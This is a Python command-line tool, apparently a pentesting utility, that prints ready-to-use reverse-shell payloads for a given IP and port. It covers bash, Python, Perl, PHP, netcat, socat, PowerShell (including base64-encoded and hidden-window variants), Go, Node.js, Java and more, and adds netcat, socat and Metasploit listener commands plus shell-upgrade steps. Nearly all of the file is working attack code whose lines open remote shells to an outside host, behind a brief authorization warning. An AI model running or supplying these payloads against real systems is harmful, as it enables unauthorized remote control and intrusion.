#!/usr/bin/env python3
"""18 · REVERSE SHELL GENERATOR — Generate reverse shell payloads for pentesting"""

import argparse, base64, urllib.parse
from colorama import Fore, Style, init
init(autoreset=True)

BANNER = f"{Fore.RED}╔══════════════════════════════════════╗\n║  💻 REVERSE SHELL GENERATOR  v1.0   ║\n║  Payloads for authorized pentesting  ║\n╚══════════════════════════════════════╝{Style.RESET_ALL}"

def generate_shells(ip: str, port: int) -> dict:
    b64_bash = base64.b64encode(f"bash -i >& /dev/tcp/{ip}/{port} 0>&1".encode()).decode()
    b64_ps   = base64.b64encode(f"$client=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()".encode("utf-16le")).decode()

    return {
        "Bash TCP": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "Bash UDP": f"bash -i >& /dev/udp/{ip}/{port} 0>&1",
        "Bash Base64": f"echo {b64_bash}|base64 -d|bash",
        "Python 3": f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "Python 2": f"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "Perl": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
        "PHP": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "Ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "Netcat": f"nc -e /bin/sh {ip} {port}",
        "Netcat mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
        "Socat": f"socat tcp-connect:{ip}:{port} exec:/bin/sh,pty,stderr,setsid,sigint,sane",
        "PowerShell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});",
        "PowerShell Base64": f"powershell -enc {b64_ps}",
        "Golang": f"""echo 'package main;import("os/exec";"net");func main(){{c,_:=net.Dial("tcp","{ip}:{port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/r.go && go run /tmp/r.go""",
        "Awk": f"awk 'BEGIN {{s = \"/inet/tcp/0/{ip}/{port}\"; while(42) {{do{{printf \"shell>\" |& s;s |& getline c;if(c){{while ((c |& getline) > 0)print |& s;close(c)}}}} while(c != \"exit\")close(s)}}}}' /dev/null",
        "Node.js": f"node -e \"var net=require('net'),sh=require('child_process').spawn('/bin/sh');var client=new net.Socket();client.connect({port},'{ip}',function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client)}});\"",
        "Java": f"r = Runtime.getRuntime();p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done\"]);p.waitFor();",
        "Telnet": f"TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | /bin/sh 1>$TF",
        "Xterm": f"xterm -display {ip}:1",
        "Rustcat": f"rustcat {ip} {port} -e /bin/bash",
    }

def generate_listener(port: int, shell_type: str = "standard") -> dict:
    listeners = {
        "Netcat basic":    f"nc -nlvp {port}",
        "Netcat verbose":  f"nc -nlvp {port} -k",
        "Socat PTY":       f"socat file:`tty`,raw,echo=0 tcp-listen:{port}",
        "pwncat-cs":       f"pwncat-cs -lp {port}",
        "Metasploit":      f"use exploit/multi/handler\nset payload linux/x64/shell_reverse_tcp\nset LHOST 0.0.0.0\nset LPORT {port}\nrun",
    }
    return listeners

def upgrade_shell() -> list:
    return [
        "# Upgrade basic shell to full TTY:",
        "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
        "# OR",
        "python -c 'import pty;pty.spawn(\"/bin/bash\")'",
        "# Then background with Ctrl+Z:",
        "stty raw -echo; fg",
        "reset",
        "export TERM=xterm",
        "export SHELL=bash",
        "stty rows 38 columns 116",
    ]

def main():
    print(BANNER)
    print(f"{Fore.RED}⚠  SOLO USAR EN SISTEMAS PROPIOS O CON AUTORIZACIÓN ESCRITA.{Style.RESET_ALL}\n")

    parser = argparse.ArgumentParser(description="Reverse Shell Generator")
    parser.add_argument("-i","--ip",    required=True, help="IP del listener (tu máquina)")
    parser.add_argument("-p","--port",  type=int, default=4444)
    parser.add_argument("-t","--type",  default=None, help="Tipo específico (ej: Python 3)")
    parser.add_argument("--listener",   action="store_true")
    parser.add_argument("--upgrade",    action="store_true")
    parser.add_argument("-o","--output",default=None)
    args = parser.parse_args()

    shells = generate_shells(args.ip, args.port)

    if args.type:
        matches = {k:v for k,v in shells.items() if args.type.lower() in k.lower()}
        if matches:
            for name, cmd in matches.items():
                print(f"\n  {Fore.CYAN}[{name}]{Style.RESET_ALL}")
                print(f"  {Fore.YELLOW}{cmd}{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}Tipo no encontrado. Tipos disponibles:")
            for k in shells: print(f"  - {k}")
    else:
        print(f"{Fore.CYAN}[*] IP: {args.ip}  Puerto: {args.port}\n")
        for name, cmd in shells.items():
            print(f"  {Fore.CYAN}[{name}]{Style.RESET_ALL}")
            print(f"  {Fore.YELLOW}{cmd}{Style.RESET_ALL}\n")

    if args.listener:
        listeners = generate_listener(args.port)
        print(f"\n{Fore.GREEN}{'─'*44}")
        print(f"{Fore.GREEN}LISTENERS:{Style.RESET_ALL}")
        for name, cmd in listeners.items():
            print(f"\n  {Fore.CYAN}[{name}]{Style.RESET_ALL}")
            print(f"  {Fore.GREEN}{cmd}{Style.RESET_ALL}")

    if args.upgrade:
        print(f"\n{Fore.GREEN}{'─'*44}")
        print(f"{Fore.GREEN}UPGRADE SHELL:{Style.RESET_ALL}")
        for line in upgrade_shell():
            print(f"  {Fore.YELLOW}{line}{Style.RESET_ALL}")

    if args.output:
        import json
        with open(args.output,"w") as f:
            json.dump({"ip":args.ip,"port":args.port,"shells":shells}, f, indent=2)
        print(f"\n{Fore.CYAN}[*] Guardado: {args.output}")

if __name__ == "__main__":
    main()
